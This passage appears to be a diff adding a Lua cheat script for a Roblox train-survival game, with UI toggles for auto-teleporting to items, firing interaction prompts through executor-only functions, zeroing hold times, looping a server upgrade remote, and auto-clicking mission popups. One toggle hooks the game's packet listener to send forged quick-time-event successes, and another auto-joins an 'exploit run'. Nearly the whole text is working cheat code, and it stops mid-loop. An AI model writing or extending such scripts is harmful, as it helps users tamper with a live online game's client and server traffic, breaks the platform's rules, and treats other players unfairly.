+		if not ui then return nil end
+		local options = ui.Main and ui.Main:FindFirstChild("Options")
+		if not options then return nil end
+		for _, frame in ipairs(options:GetChildren()) do
+			if frame.Name:sub(1, 2) == "K_" then
+				return frame.Name
+			end
+		end
+		return nil
+	end)
+	return ok and result or nil
+end
+
+local function isBlacklisted(missionId)
+	if not missionId then return false end
+	for _, id in ipairs(MissionBlacklist) do
+		if id == missionId then return true end
+	end
+	return false
+end
+
+local function vimClick(x, y)
+	VIM:SendMouseButtonEvent(x, y, 0, true, game, 1)
+	task.wait(0.02)
+	VIM:SendMouseButtonEvent(x, y, 0, false, game, 1)
+	task.wait(0.08)
+end
+
+local function clickSkip()
+	vimClick(391, 315)
+	vimClick(391, 312)
+	vimClick(389, 311)
+	vimClick(391, 316)
+end
+
+local function clickAccept()
+	vimClick(424, 243)
+	vimClick(424, 248)
+	vimClick(424, 248)
+	vimClick(404, 257)
+end
+
+local function handleMission()
+	local waited = 0
+	local missionId
+	repeat
+		task.wait(0.1)
+		waited += 0.1
+		missionId = getActiveMissionId()
+	until missionId or waited >= 4
+
+	if not missionId then return end
+	task.wait(0.1)
+
+	if isBlacklisted(missionId) then
+		clickSkip()
+	else
+		clickAccept()
+	end
+end
+
+local function waitForKeplies()
+	local entries = {}
+	local waited  = 0
+	repeat
+		entries = findAllKepliePrompts()
+		if #entries == 0 then
+			task.wait(0.5)
+			waited += 0.5
+		end
+	until #entries > 0 or not KeplieEnabled
+	return entries
+end
+
+local function DoKeplie()
+	while KeplieEnabled do
+
+		-- wait until keplies exist
+		local entries = waitForKeplies()
+		if not KeplieEnabled then break end
+
+		-- ONLY handle ONE keplie per zone
+		local entry = entries[1]
+		if entry then
+			local prompt = entry.prompt
+			local part   = entry.part
+
+			if prompt and prompt.Parent and part and part.Parent then
+
+				-- 1: teleport
+				local hrp = getHRP()
+				if hrp then
+					hrp.CFrame = part.CFrame * CFrame.new(0, 2, 0)
+				end
+				task.wait(0.05)
+
+				-- 2: fire prompt
+				pcall(function() fireproximityprompt(prompt, 0) end)
+				task.wait(0.05)
+
+				-- 3: handle mission popup
+				handleMission()
+
+				-- 4: WATCH ONLY THIS KEPLIE
+				local watchTime = 0
+				while KeplieEnabled and prompt.Parent and watchTime < 10 do
+					task.wait(0.2)
+					watchTime += 0.2
+				end
+
+				-- 5: keplie disappeared → NEW ZONE → restart loop
+				-- (this break ensures we do NOT continue to other keplies)
+				break
+			end
+		end
+
+		task.wait(0.2)
+	end
+end
+
+local MISSION_LIST = {
+	"Don't be spotted by any rejects",
+	"Don't run out of Stamina",
+	"Let yourself be hit exactly once",
+	"Fail all your skillchecks",
+	"Have a completely random speed stat",
+	"Reset to 1 HP every zone",
+	"Survive with no sprint",
+	"Survive with 10 Stamina",
+	"Lose 2 HP every second whilst being chased",
+	"Survive with 10 Stealth",
+}
+
+MainTab:Dropdown({
+	Title     = "Keplie Mission Blacklist",
+	Desc      = "Selected missions will be auto-skipped",
+	Values    = MISSION_LIST,
+	Value     = {},
+	Multi     = true,
+	AllowNone = true,
+	Callback  = function(selected)
+		MissionBlacklist = {}
+		for _, desc in ipairs(selected) do
+			local id = MISSION_ID_MAP[desc]
+			if id then
+				table.insert(MissionBlacklist, id)
+			end
+		end
+	end
+})
+
+MainTab:Toggle({
+	Title = "Auto Keplie",
+	Desc  = "Collects Keplies and handles mission popups",
+	Value = false,
+	Callback = function(state)
+		KeplieEnabled = state
+		if KeplieEnabled then
+			if not KeplieThread then
+				KeplieThread = task.spawn(function()
+					DoKeplie()
+					KeplieThread = nil
+				end)
+			end
+		else
+			KeplieEnabled = false
+			KeplieThread  = nil
+		end
+	end
+})
+-- Create toggle in your main tab
+local InstantFireToggle = MainTab:Toggle({
+    Title = "Instant Fire Prompt",
+    Desc = "Makes hold prompts instant",
+    Icon = "",
+    Value = false, -- default OFF
+    Callback = function(state)
+        getgenv().InstantFireEnabled = state
+
+        -- Apply to all existing prompts
+        for _, prompt in ipairs(game:GetDescendants()) do
+            if prompt:IsA("ProximityPrompt") then
+                if state then
+                    prompt.HoldDuration = 0
+                else
+                    prompt.HoldDuration = 1 -- reset default (adjust if needed)
+                end
+            end
+        end
+    end
+})
+
+-- Auto-apply to new prompts
+game.DescendantAdded:Connect(function(desc)
+    if desc:IsA("ProximityPrompt") then
+        if getgenv().InstantFireEnabled then
+            desc.HoldDuration = 0
+        end
+    end
+end)
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+getgenv().AutoBuyItems = getgenv().AutoBuyItems or false
+local blacklist = {}
+local buyingItems = {}
+
+local function normalizeName(name)
+    if not name then return "" end
+    local s = tostring(name)
+    s = s:gsub("[%z\1-\31\127\194-\244][\128-\191]*", "")
+    s = s:gsub("%W", "")
+    s = s:lower()
+    return s
+end
+
+local function isBlacklisted(rawName)
+    local norm = normalizeName(rawName)
+    for blockedName in pairs(blacklist) do
+        if norm == blockedName or norm:find(blockedName) then
+            return true
+        end
+    end
+    return false
+end
+
+local function rebuildBlacklistFromSelection(selection)
+    blacklist = {}
+    if not selection then return end
+    for _, v in pairs(selection) do
+        local name
+        if type(v) == "table" then
+            name = v.Title or v.Name
+        else
+            name = v
+        end
+        if name then
+            local norm = normalizeName(name)
+            if norm ~= "" then
+                blacklist[norm] = true
+            end
+        end
+    end
+end
+
+local function HoldPrompt(prompt)
+    if not prompt or not prompt.Enabled then return end
+    prompt:InputHoldBegin()
+    task.wait(prompt.HoldDuration + 0.15)
+    prompt:InputHoldEnd()
+end
+
+local autoBuyThread = nil
+
+local function runAutoBuy()
+    local container = workspace:WaitForChild("Persistent"):WaitForChild("BaseTrain"):WaitForChild("BaseTrain"):WaitForChild("DextecItemSpawns")
+    while getgenv().AutoBuyItems do
+        for _, itemModel in ipairs(container:GetChildren()) do
+            if itemModel and itemModel.Parent and not isBlacklisted(itemModel.Name) then
+                if getgenv().TaskLock then
+                    task.wait(0.2)
+                    continue
+                end
+
+                local prompt = itemModel:FindFirstChildWhichIsA("ProximityPrompt", true)
+                if prompt and not buyingItems[itemModel] then
+                    buyingItems[itemModel] = true
+                    getgenv().TaskLock = true
+
+                    pcall(function()
+                        HoldPrompt(prompt)
+                    end)
+
+                    getgenv().TaskLock = false
+                    task.wait(0.3)
+                end
+            end
+        end
+        task.wait(0.5)
+    end
+    autoBuyThread = nil
+end
+
+local function startAutoBuy()
+    if getgenv().AutoBuyItems then return end
+    getgenv().AutoBuyItems = true
+    if not autoBuyThread then
+        autoBuyThread = task.spawn(runAutoBuy)
+    end
+end
+
+local function stopAutoBuy()
+    getgenv().AutoBuyItems = false
+    autoBuyThread = nil
+end
+
+local rawItemList = {
+    "StuffingSamples","EfficiencyFluff","SpeedFluff","StealthFluff","StaminaFluff",
+    "Banana","BrokenClock","RippedThread","FluffShield","HealingPatch",
+    "StickyBomb","RejectRadar","Compass","Stimulant","FluffKit",
+    "InstantCharger","PlushieTea","SecurityBlanket","TheBlueprint","StaticShock",
+    "SecondSpool","MagicClock","MegaKit","FactoryMold","DollysCaress",
+}
+
+local function buildDropdownValues()
+    local t = {}
+    for _, v in ipairs(rawItemList) do
+        table.insert(t, v)
+    end
+    table.sort(t)
+    return t
+end
+
+local AutoBuyDropdown = MainTab:Dropdown({
+    Title = "Auto-Buy Blacklist",
+    Values = buildDropdownValues(),
+    Value = {},
+    Multi = true,
+    AllowNone = true,
+    SearchBarEnabled = true,
+    Callback = function(option)
+        rebuildBlacklistFromSelection(option)
+    end
+})
+
+MainTab:Toggle({
+    Title = "Auto Buy Items",
+    Value = getgenv().AutoBuyItems,
+    Callback = function(state)
+        if state then startAutoBuy() else stopAutoBuy() end
+    end
+})
+-- Auto HiFly (REAL FIX)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+getgenv().AutoHiFly = getgenv().AutoHiFly or false
+
+local packets = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Packets"))
+
+local hooked = false
+local oldListen
+
+local function hook()
+    if hooked then return end
+    hooked = true
+
+    oldListen = packets.hiFlyEvent.listen
+
+    packets.hiFlyEvent.listen = function(callback)
+        return oldListen(function(data)
+            -- run original
+            if callback then
+                task.spawn(callback, data)
+            end
+
+            -- ✅ AUTO QTE
+            if getgenv().AutoHiFly and data and data.eventType == "QTE" then
+                task.spawn(function()
+                    packets.hiFlyEvent.send({
+                        eventType = "PromptResult",
+                        success = true
+                    })
+                end)
+            end
+        end)
+    end
+end
+
+local function start()
+    getgenv().AutoHiFly = true
+    hook()
+end
+
+local function stop()
+    getgenv().AutoHiFly = false
+end
+
+-- Toggle
+MainTab:Toggle({
+    Title = "Auto HiFly",
+    Flag = "hifly_toggle",
+    Value = getgenv().AutoHiFly,
+    Callback = function(state)
+        if state then
+            start()
+        else
+            stop()
+        end
+    end
+})
+
+-- =========================
+-- REMOTE
+-- =========================
+local remote = game:GetService("ReplicatedStorage")
+    :WaitForChild("Remotes")
+    :WaitForChild("TrainUpgradeFunction")
+
+-- =========================
+-- HELPERS
+-- =========================
+local function enemiesExist()
+    local folder = workspace:FindFirstChild("Enemies")
+    return folder and #folder:GetChildren() > 0
+end
+
+-- =========================
+-- STATE
+-- =========================
+local autoUpgradeEnabled = false
+local autoUpgradeThread = nil
+
+-- =========================
+-- AUTO UPGRADE LOOP
+-- =========================
+local function runAutoUpgrade()
+    while autoUpgradeEnabled do
+        if enemiesExist() then
+            -- Pause if enemies exist
+            task.wait(0.5)
+        else
+            -- Invoke remote if no enemies
+            pcall(function()
+                remote:InvokeServer({
+                    UpgradeName = "StuffedRejects",
+                    Action = "Contribute",
+                    ContributionType = "ContributeAll"
+                })
+            end)
+            task.wait(0.5) -- delay between calls
+        end
+    end
+    autoUpgradeThread = nil
+end
+
+-- =========================
+-- CONTROL
+-- =========================
+local function startAutoUpgrade()
+    if autoUpgradeEnabled then return end
+    autoUpgradeEnabled = true
+
+    -- Check immediately
+    if enemiesExist() then
+        print("Enemies detected! Waiting for them to disappear...")
+    else
+        print("No enemies detected! Starting auto-upgrade...")
+    end
+
+    if not autoUpgradeThread then
+        autoUpgradeThread = task.spawn(runAutoUpgrade)
+    end
+end
+
+local function stopAutoUpgrade()
+    autoUpgradeEnabled = false
+end
+
+-- =========================
+-- TOGGLE (MainTab UI)
+-- =========================
+MainTab:Toggle({
+    Title = "Auto Upgrade",
+    Desc = "upgrading the train even when gui didn't appear ",
+    Flag = "auto_upgrade_toggle",
+    Value = false,
+    Callback = function(state)
+        if state then
+            startAutoUpgrade()
+        else
+            stopAutoUpgrade()
+        end
+    end,
+})
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
+
+local DOLLYS_PLACE_ID = 99146394215857
+local checkingConnection = nil
+local isEnabled = false
+local isTeleporting = false
+
+local function checkGameEndAndTeleport()
+    if isTeleporting then return end
+    local player = Players.LocalPlayer
+    if not player then return end
+    local gui = player:FindFirstChild("PlayerGui")
+    if not gui then return end
+    local gameEndScreen = gui:FindFirstChild("GameEndScreen")
+    if not gameEndScreen then return end
+    local main = gameEndScreen:FindFirstChild("Main")
+    if not main then return end
+    if main.Visible == true then
+        isTeleporting = true
+        pcall(function()
+            TeleportService:Teleport(DOLLYS_PLACE_ID, player)
+        end)
+        task.delay(5, function()
+            isTeleporting = false
+        end)
+    end
+end
+
+local function startChecking()
+    if checkingConnection then return end
+    checkingConnection = RunService.Heartbeat:Connect(function(dt)
+        checkGameEndAndTeleport()
+    end)
+end
+
+local function stopChecking()
+    if checkingConnection then
+        checkingConnection:Disconnect()
+        checkingConnection = nil
+    end
+    isTeleporting = false
+end
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+assert(MainTab, "MainTab not found. Run this after creating PlayerTab.")
+
+local AUTO_ENABLED = false
+local connections = {}
+local isTeleporting = false
+local TARGET_INDEX = 2
+
+local function getLobbyExists()
+    local map = workspace:FindFirstChild("Map")
+    if not map then return false end
+    local persistent = map:FindFirstChild("Persistent")
+    if not persistent then return false end
+    return persistent:FindFirstChild("Lobby") ~= nil
+end
+
+local function getTargetModel()
+    local map = workspace:FindFirstChild("Map")
+    if not map then return nil end
+    local lobbyTrain = map:FindFirstChild("LobbyTrain")
+    if not lobbyTrain then return nil end
+    local children = lobbyTrain:GetChildren()
+    if not children or #children < TARGET_INDEX then return nil end
+    local entry = children[TARGET_INDEX]
+    if not entry then return nil end
+    local model = entry:FindFirstChild("Model") or entry:FindFirstChildWhichIsA("Model")
+    if model and model:IsA("Model") then
+        return model
+    end
+    return nil
+end
+
+local function teleportToModel(model)
+    if not model then return false, "No model" end
+    local player = Players.LocalPlayer
+    if not player then return false, "No player" end
+    local char = player.Character or player.CharacterAdded:Wait()
+    if not char then return false, "No character" end
+    local primary = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
+    if not primary then return false, "Target model has no primary part" end
+    local charPrimary = char.PrimaryPart or char:FindFirstChildWhichIsA("BasePart")
+    if not charPrimary then return false, "Character has no primary part" end
+    local ok, err = pcall(function()
+        charPrimary.CFrame = primary.CFrame + Vector3.new(0, 3, 0)
+    end)
+    if not ok then return false, err end
+    return true
+end
+
+local function checkAndTeleportToLobbyTrain()
+    if isTeleporting then return end
+    if not getLobbyExists() then return end
+    local count = #Players:GetPlayers()
+    if count >= 2 then
+        local model = getTargetModel()
+        if not model then return end
+        isTeleporting = true
+        task.spawn(function()
+            local ok, err = teleportToModel(model)
+            if not ok then
+                warn("Auto join solo run teleport failed:", err)
+            end
+            task.wait(1)
+            isTeleporting = false
+        end)
+    end
+end
+
+local function startAutoJoinSoloRun()
+    if AUTO_ENABLED then return end
+    AUTO_ENABLED = true
+    connections.PlayerAdded = Players.PlayerAdded:Connect(function()
+        task.wait(0.1)
+        checkAndTeleportToLobbyTrain()
+    end)
+    connections.PlayerRemoving = Players.PlayerRemoving:Connect(function()
+        task.wait(0.1)
+        checkAndTeleportToLobbyTrain()
+    end)
+    task.spawn(function() task.wait(0.2); checkAndTeleportToLobbyTrain() end)
+end
+
+local function stopAutoJoinSoloRun()
+    AUTO_ENABLED = false
+    for k, v in pairs(connections) do
+        if v and v.Disconnect then v:Disconnect() end
+        connections[k] = nil
+    end
+    isTeleporting = false
+end
+
+MainTab:Toggle({
+    Title = "Auto join solo run",
+    Desc = "Disable Verify Teleport if you are on Delta",
+    Color = Color3.fromHex("#ffb86b"),
+    Justify = "Center",
+    IconAlign = "Left",
+    Icon = "",
+    Default = false,
+    Callback = function(state)
+        if state then
+            startAutoJoinSoloRun()
+        else
+            stopAutoJoinSoloRun()
+        end
+    end
+})
+-- Auto Join Solo Run Toggle (Maintab)
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local placeId = 72515936648142
+local launchData = "91e45b82-3627-4dc6-9cb5-d5441067fdd7"
+local maxAttemptsPerTry = 3
+
+local autoJoinSolo = false
+local autoJoinSoloThread = nil
+
+local function notifyTeleportFailed()
+    if WindUI and WindUI.Notify then
+        pcall(function()
+            WindUI:Notify({
+                Title = "Teleport Failed",
+                Content = "Please disable Verify Teleport if you are on Delta",
+                Duration = 6
+            })
+        end)
+    end
+end
+
+local function tryTeleport()
+    local attempts = 0
+    while attempts < maxAttemptsPerTry do
+        attempts = attempts + 1
+        local ok, err = pcall(function()
+            TeleportService:TeleportToPlaceInstance(placeId, launchData, player)
+        end)
+        if ok then
+            return true
+        end
+        task.wait(0.6 + attempts * 0.2)
+    end
+    notifyTeleportFailed()
+    return false
+end
+
+local function autoJoinSoloLoop()
+    while autoJoinSolo do
+        task.wait(1)
+        local map = workspace:FindFirstChild("Map")
+        if not map then continue end
+        local visual = map:FindFirstChild("Visual")
+        if not visual then continue end
+        local lobby = visual:FindFirstChild("Christmas Lobby")
+        if not lobby then continue end
+
+        -- check for the specific child index presence (mirrors original logic)
+        local children = lobby:GetChildren()
+        if children[94] then
+            -- attempt teleport (non-blocking)
+            pcall(function() tryTeleport() end)
+            -- avoid spamming attempts immediately after a teleport attempt
+            task.wait(4)
+        end
+    end
+    autoJoinSoloThread = nil
+end
+
+-- Maintab toggle
+MainTab:Toggle({
+    Title = "Auto join exploit run",
+    Desc = "Sometimes will make you join exploit run and solo runs Disable Verify Teleport if you are on Delta",
+    Flag = "auto_join_solo_toggle",
+    Value = false,
+    Callback = function(state)
+        autoJoinSolo = state
+        if autoJoinSolo then
+            if not autoJoinSoloThread then
+                autoJoinSoloThread = task.spawn(autoJoinSoloLoop)
+            end
+        else
+            autoJoinSolo = false
+        end
+    end
+})
+MainTab:Toggle({
+    Title = "Auto rejoin on death",
+    Desc = "",
+    Color = Color3.fromHex("#ffb86b"),
+    Justify = "Center",
+    IconAlign = "Left",
+    Icon = "",
+    Default = false,
+    Callback = function(state)
+        isEnabled = state
+        if state then
+            startChecking()
+        else
+            stopChecking()
+        end
+    end
+})
+--// Auto Pickup (Misc + Event FIXED)
+
+-- Config
+local TELEPORT_OFFSET_Y = 3
+local FIRE_DELAY = 0.12
+local SCAN_DELAY = 0.1
+local PROMPT_COOLDOWN = 0.5
+
+-- State
+local _autoMisc = false
+local _autoEvent = false
+local _miscThread = nil
+local _eventThread = nil
+
+-- Services
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+--// Helpers
+local function getHRP()
+    local char = player.Character or player.CharacterAdded:Wait()
+    return char and char:FindFirstChild("HumanoidRootPart")
+end
+
+local function teleport(part)
+    local hrp = getHRP()
+    if not hrp or not part then return end
+    hrp.CFrame = part.CFrame + Vector3.new(0, TELEPORT_OFFSET_Y, 0)
+end
+
+local function firePrompt(prompt)
+    pcall(function()
+        if fireproximityprompt then
+            fireproximityprompt(prompt, 0)
+        else
+            prompt:InputHoldBegin()
+            task.wait(0.05)
+            prompt:InputHoldEnd()
+        end
+    end)
+end
+
+local function getPart(prompt)
+    if not prompt or not prompt.Parent then return nil end
+
+    if prompt.Parent:IsA("BasePart") then
+        return prompt.Parent
+    end
+
+    for _, v in ipairs(prompt.Parent:GetDescendants()) do
+        if v:IsA("BasePart") then
+            return v
+        end
+    end
+
+    return nil
+end
+
+-- Detect type (IMPORTANT FIX)
+local function isMisc(prompt)
+    return prompt:IsDescendantOf(workspace:FindFirstChild("Pickup") and workspace.Pickup:FindFirstChild("Misc"))
+end
+
+local function isEvent(prompt)
+    return prompt:IsDescendantOf(workspace:FindFirstChild("Pickup") and workspace.Pickup:FindFirstChild("Event"))
+end
+
+local function notify(t, c)
+    pcall(function()
+        if WindUI then
+            WindUI:Notify({Title = t, Content = c, Duration = 3})
+        end
+    end)
+end
+
+--// LOOP
+local function startLoop(typeName)
+    local enabled = (typeName == "Misc" and _autoMisc) or (typeName == "Event" and _autoEvent)
+
+    local thread = task.spawn(function()
+        local last = setmetatable({}, {__mode="k"})
+
+        while (typeName == "Misc" and _autoMisc) or (typeName == "Event" and _autoEvent) do
+            for _, obj in ipairs(workspace:GetDescendants()) do
+                if not ((typeName == "Misc" and _autoMisc) or (typeName == "Event" and _autoEvent)) then break end
+
+                if obj:IsA("ProximityPrompt") and obj.Enabled then
+                    -- FILTER HERE
+                    if (typeName == "Misc" and isMisc(obj)) or (typeName == "Event" and isEvent(obj)) then
+
+                        if tick() - (last[obj] or 0) >= PROMPT_COOLDOWN then
+                            local part = getPart(obj)
+
+                            if part then
+                                teleport(part)
+                                task.wait(FIRE_DELAY)
+                                firePrompt(obj)
+                                last[obj] = tick()
+                                task.wait(0.05)
+                            end
+                        end
+
+                    end
+                end
+            end
+
+            task.wait(SCAN_DELAY)
+        end
+    end)
+
+    return thread
+end
+
+--// TOGGLES
+
+MainTab:Toggle({
+    Title = "Auto pickup misc items",
+    Value = false,
+    Callback = function(v)
+        _autoMisc = v
+
+        if v then
+            _miscThread = startLoop("Misc")
+            notify("Misc Pickup", "Started")
+        else
+            notify("Misc Pickup", "Stopped")
+        end
+    end
+})
+
+MainTab:Toggle({
+    Title = "Auto pickup event items",
+    Value = false,
+    Callback = function(v)
+        _autoEvent = v
+
+        if v then
+            _eventThread = startLoop("Event")
+            notify("Event Pickup", "Started")
+        else
+            notify("Event Pickup", "Stopped")
+        end
+    end
+})
+
+
+
+--// Blackout UI (PlayerGui)
+local BlackoutGui = Instance.new("ScreenGui")
+BlackoutGui.Name = "BlackoutMode"
+BlackoutGui.IgnoreGuiInset = true
+BlackoutGui.ResetOnSpawn = false
+BlackoutGui.Parent = player:WaitForChild("PlayerGui")
+
+local BlackFrame = Instance.new("Frame")
+BlackFrame.Size = UDim2.fromScale(1, 1)
+BlackFrame.Position = UDim2.fromScale(0, 0)
+BlackFrame.BackgroundColor3 = Color3.new(0,0,0)
+BlackFrame.BackgroundTransparency = 1 -- initially off
+BlackFrame.BorderSizePixel = 0
+BlackFrame.ZIndex = 1 -- low, WindUI stays on top
+BlackFrame.Parent = BlackoutGui
+
+--// Toggle in MainTab
+MainTab:Toggle({
+    Title = "Blackout Mode",
+    Desc = "Make everything black except the UI",
+    Value = false,
+    Callback = function(state)
+        BlackFrame.BackgroundTransparency = state and 0 or 1
+    end
+})
+
+-- Auto collect toggle (Maintab)
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+
+local function HRP()
+    local char = player.Character or player.CharacterAdded:Wait()
+    return char:WaitForChild("HumanoidRootPart")
+end
+
+local function getPrompt(obj)
+    for _, v in ipairs(obj:GetDescendants()) do
+        if v:IsA("ProximityPrompt") then
+            return v
+        end
+    end
+    return nil
+end
+
+local function getPart(obj)
+    if not obj then return nil end
+    if obj:IsA("BasePart") then
+        return obj
+    end
+    return obj:FindFirstChildWhichIsA("BasePart")
+end
+local autoCollectEnabled = false
+local autoCollectThread = nil
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local function HRP()
+    local char = player.Character or player.CharacterAdded:Wait()
+    return char:WaitForChild("HumanoidRootPart")
+end
+
+local function getPrompt(obj)
+    for _,v in ipairs(obj:GetDescendants()) do
+        if v:IsA("ProximityPrompt") then
+            return v
+        end
+    end
+end
+
+local function getPart(obj)
+    if obj:IsA("BasePart") then
+        return obj
+    end
+    return obj:FindFirstChildWhichIsA("BasePart")
+end
+
+local function runAutoCollect()
+    while autoCollectEnabled do
+        task.wait(0.2)
+
+        local itemsFolder = workspace:FindFirstChild("Interacts")
+        itemsFolder = itemsFolder and itemsFolder:FindFirstChild("ItemCollection")
+
+        local delivery = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("DeliveryPoint")
+        local safeZone = workspace:FindFirstChild("Persistent")
+            and workspace.Persistent:FindFirstChild("Zones")
+            and workspace.Persistent.Zones:FindFirstChild("TrainSafeZone")
+
+        if not itemsFolder or not delivery then
+            continue
+        end
+
+        local items = itemsFolder:GetChildren()
+
+        -- 🚆 If no valid items → SafeZone
+        local validItemFound = false
+        for _,item in ipairs(items) do
+            if item.Name ~= "ItemCollectionHighlight" then
+                validItemFound = true
+                break
+            end
+        end
+
+        if not validItemFound then
+            if safeZone then
+                HRP().CFrame = safeZone.CFrame
+            end
+            continue
+        end
+
+        for _, item in ipairs(items) do
+            if not autoCollectEnabled then break end
+            if not item or not item.Parent then continue end
+
+            -- ❌ Ignore highlight
+            if item.Name == "ItemCollectionHighlight" then
+                continue
+            end
+
+            local part = getPart(item)
+            local prompt = getPrompt(item)
+
+            if not prompt then continue end
+
+            -- 1️⃣ TP to item
+            if part then
+                HRP().CFrame = part.CFrame
+                task.wait(0.12)
+            end
+
+            -- 2️⃣ Fire prompt
+            fireproximityprompt(prompt)
+            task.wait(0.1)
+
+            -- 3️⃣ TP to Delivery
+            HRP().CFrame = delivery.CFrame
+            task.wait(0.12)
+        end
+    end
+
+    autoCollectThread = nil
+end
+
+-- 🔘 Toggle
+MainTab:Toggle({
+    Title = "Auto Collect Train Parts",
+    Desc = "",
+    Value = false,
+    Callback = function(state)
+        autoCollectEnabled = state
+
+        if autoCollectEnabled then
+            if not autoCollectThread then
+                autoCollectThread = task.spawn(runAutoCollect)
+            end
+        else
+            autoCollectEnabled = false
+        end
+    end
+})
+
+local autoCollectEggs = false
+
+MainTab:Toggle({
+    Flag     = "AutoCollectEggs",
+    Title    = "Auto Collect Eggs",
+    Desc     = "Teleports to eggs and collects",
+    Value    = false,
+    Callback = function(state)
+        autoCollectEggs = state
+    end,
+})
+
+task.spawn(function()
+    while true do
+        task.wait(0.5)
+        if not autoCollectEggs then continue end
+
+        local eggSpawn = workspace:FindFirstChild("Map")
+            and workspace.Map:FindFirstChild("Interact")
+            and workspace.Map.Interact:FindFirstChild("EggSpawn")
+
+        if not eggSpawn then task.wait(1) continue end
+
+        local interactPart = eggSpawn:FindFirstChild("InteractPart")
+        if not interactPart then task.wait(1) continue end
+
+        local character = player.Character or player.CharacterAdded:Wait()
+        if not character then task.wait(0.5) continue end
+
+        local hrp = character:FindFirstChild("HumanoidRootPart")
+        if not hrp then task.wait(0.5) continue end
+
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+        -- Raycast down from target to find safe ground
+        local origin = interactPart.Position + Vector3.new(0, 10, 0)
+        local rayResult = workspace:Raycast(origin, Vector3.new(0, -50, 0))
+        local safeCFrame
+        if rayResult then
+            safeCFrame = CFrame.new(rayResult.Position + Vector3.new(0, 3, 0))
+        else
+            safeCFrame = interactPart.CFrame + Vector3.new(0, 3, 0)
+        end
+
+        -- Set humanoid to Physics to avoid ragdoll/falling issues
+        if humanoid then
+            pcall(function()
+                humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+            end)
+        end
+
+        -- Teleport using SetPrimaryPartCFrame for custom character
+        if character.PrimaryPart then
+            character:SetPrimaryPartCFrame(safeCFrame)
+        else
+            hrp.CFrame = safeCFrame
+        end
+
+        task.wait(0.3)
+
+        -- Restore humanoid state
+        if humanoid then
+            pcall(function()
+                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+            end)
+        end
+
+        -- Fire all interactions
+        for _, v in ipairs(interactPart:GetDescendants()) do
+            if v:IsA("ProximityPrompt") then
+                pcall(fireproximityprompt, v)
+                task.wait(0.05)
+            elseif v:IsA("ClickDetector") then
+                pcall(fireclickdetector, v)
+                task.wait(0.05)
+            elseif v:IsA("BasePart") then
+                pcall(firetouchinterest, hrp, v, 0)
+                task.wait(0.05)
+                pcall(firetouchinterest, hrp, v, 1)
+                task.wait(0.05)
+            end
+        end
+
+        pcall(firetouchinterest, hrp, interactPart, 0)
+        task.wait(0.05)
+        pcall(firetouchinterest, hrp, interactPart, 1)
+
+        -- Wait for eggs to respawn
+        task.wait(3)
+    end
+end)
+--// Services
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+
+local function getChar()
+    return player.Character or player.CharacterAdded:Wait()
+end
+
+local function getHRP()
+    return getChar():WaitForChild("HumanoidRootPart")
+end
+
+--// Globals
+getgenv().TaskLock = getgenv().TaskLock or false
+
+-- Paths
+local safeZone = workspace.Persistent.Zones.TrainSafeZone
+
+-- Groups
+local groups = {
+    "Middle Coils",
+    "Platform 2",
+    "Platform 3",
+    "Platform 4"
+}
+
+-- 🔥 Enemy check (same as stuffing)
+local function IsEnemyNearby(range)
+    local char = getChar()
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return false end
+
+    for _, v in pairs(workspace:GetDescendants()) do
+        if v:IsA("Model") and v:FindFirstChild("HumanoidRootPart") then
+            local name = v.Name:lower()
+            if name:find("hifly") or name:find("enemy") or name:find("monster") then
+                local dist = (v.HumanoidRootPart.Position - hrp.Position).Magnitude
+                if dist < range then
+                    return true
+                end
+            end
+        end
+    end
+    return false
+end
+
+-- 🔒 Task system
+local function DoTask(func)
+    if getgenv().TaskLock then return end
+    getgenv().TaskLock = true
+    pcall(func)
+    getgenv().TaskLock = false
+end
+
+-- Utility: Teleport (safer)
+local function teleportTo(target)
+    local hrp = getHRP()
+    if target and target:IsA("BasePart") then
+        hrp.CFrame = target.CFrame * CFrame.new(0, 3, 0)
+        task.wait(0.3)
+    end
+end
+
+-- 🔥 FIXED HOLD (Bug 3 prep)
+local function fireCoilPrompt(prompt)
+    if prompt and prompt:IsA("ProximityPrompt") then
+        prompt:InputHoldBegin()
+        task.wait(prompt.HoldDuration or 1) -- REAL hold time
+        prompt:InputHoldEnd()
+    end
+end
+
+-- Get coils
+local function getAllCoilPrompts()
+    local coilActivators = workspace:FindFirstChild("Map")
+        and workspace.Map:FindFirstChild("Interact")
+        and workspace.Map.Interact:FindFirstChild("TeslaCoil")
+        and workspace.Map.Interact.TeslaCoil:FindFirstChild("CoilActivators")
+
+    if not coilActivators then return {} end
+
+    local prompts = {}
+    for _, groupName in ipairs(groups) do
+        local group = coilActivators:FindFirstChild(groupName)
+        if group then
+            for _, coil in ipairs(group:GetDescendants()) do
+                local prompt = coil:FindFirstChildOfClass("ProximityPrompt")
+                if prompt and coil:IsA("BasePart") then
+                    table.insert(prompts, {coil = coil, prompt = prompt})
+                end
+            end
+        end
+    end
+    return prompts
+end
+
+-- Toggle
+local coilAutomationEnabled = false
+
+task.spawn(function()
+    local wave = 0
+
+    while true do
+        if coilAutomationEnabled then
+
+            -- ❌ WAIT if other task running (Bug 1 fix)
+            if getgenv().TaskLock then
+                task.wait(0.5)
+                continue
+            end
+
+            local prompts = getAllCoilPrompts()
+
+            if #prompts == 0 then
+                task.wait(2)
+            else
+                wave += 1
+
+                for _, data in ipairs(prompts) do
+                    if not coilAutomationEnabled then break end
+
+                    -- ❌ WAIT if unsafe (Bug 2 fix)
+                    if IsEnemyNearby(25) then
+                        task.wait(0.5)
+                        continue
+                    end
+
+                    DoTask(function()
+                        teleportTo(data.coil)
+                        fireCoilPrompt(data.prompt)
+                        task.wait(0.2)
+                    end)
+                end
+
+                task.wait(1)
